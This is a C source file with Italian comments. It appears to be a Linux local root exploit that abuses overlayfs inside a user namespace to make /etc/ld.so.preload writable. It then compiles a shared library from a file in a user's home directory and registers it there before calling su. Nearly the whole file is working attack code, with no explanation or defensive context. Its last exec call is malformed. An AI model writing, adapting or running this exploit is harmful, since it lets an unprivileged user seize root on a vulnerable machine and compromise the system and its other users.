#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sched.h>
#include <signal.h>
#include <fcntl.h>
#include <linux/sched.h>
#include <string.h>


#define STACK_SIZE 1024*1024


static char stack[STACK_SIZE];

static int child_exec(void *rooting)
{
    char *f;
    system("rm -rf /tmp/prova_root");
    mkdir("/tmp/prova_root", 0777);
    mkdir("/tmp/prova_root/work", 0777);
    mkdir("/tmp/prova_root/upper",0777);
    mkdir("/tmp/prova_root/o",0777);
    
    if (mount("overlay", "/tmp/prova_root/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/prova_root/upper") != 0) {
        if (mount("overlay", "/tmp/prova_root/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/prova_root/upper,workdir=/tmp/prova_root/work") != 0) {
            printf("Impossibile montare fs\n");
            exit(-1);
        }
        f = ".access";
        chmod("/tmp/prova_root/work/work",0777);
    } else f = "ns_last_pid";
    
    chdir("/tmp/prova_root/o");
    rename(f,"ld.so.preload");
    
    chdir("/");
    umount("/tmp/prova_root/o");
    
    
    if (mount("overlay", "/tmp/prova_root/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/prova_root/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/prova_root/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/prova_root/upper,upperdir=/etc,workdir=/tmp/prova_root/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/prova_root/work/work",0777);
    }
    
    chmod("/tmp/prova_root/o/ld.so.preload",0777);
    umount("/tmp/prova_root/o");
}

int main(int argc, char **argv)
{
    int status, fd, fd_lib,fd2;
    pid_t ch1,ch2;

	//Carico in un buffer la libreia condivisa per swithcare l'user	
	char buffer_lib[4096];   
	if((fd2=open("/home/0124000514/shared_lib.c",O_RDONLY))==-1)
	{
	perror("Errore ");
	exit(-1);
	}

	read(fd2,buffer_lib,sizeof(buffer_lib));
	close(fd2);



    printf("Genero figli..\n");

    if((ch1 = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            perror("Errore :");

        if((ch2 = fork()) == 0) {
            pid_t pid ;
           pid= clone(child_exec, stack + STACK_SIZE, CLONE_NEWNS, NULL);
            if(pid < 0) {
                perror("Errore namespace :");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(ch2, &status, 0);
        return 0;
    }
    
    usleep(300000);

    wait(NULL);

    printf("Figli creati\n");
    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        printf("Errore apertura ld.so.preload\n");
        exit(-1);
    }
    else
        printf("/etc/ld.so.preload aperto\n");

    printf("creazione libreria condivisa\n");
    fd_lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);

	//DEBUG
	//printf("%s\n",buffer_lib);
	write(fd_lib,buffer_lib,strlen(buffer_lib));

 	close(fd_lib);

    	fd_lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");

    if(fd_lib != 0) {
        perror("errore creazione libreria: ");
        exit(-1);
    }

    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);

    system("rm -rf /tmp/prova_root /tmp/lib.c");


    execl("/bin/su && bash","su",NULL);
}
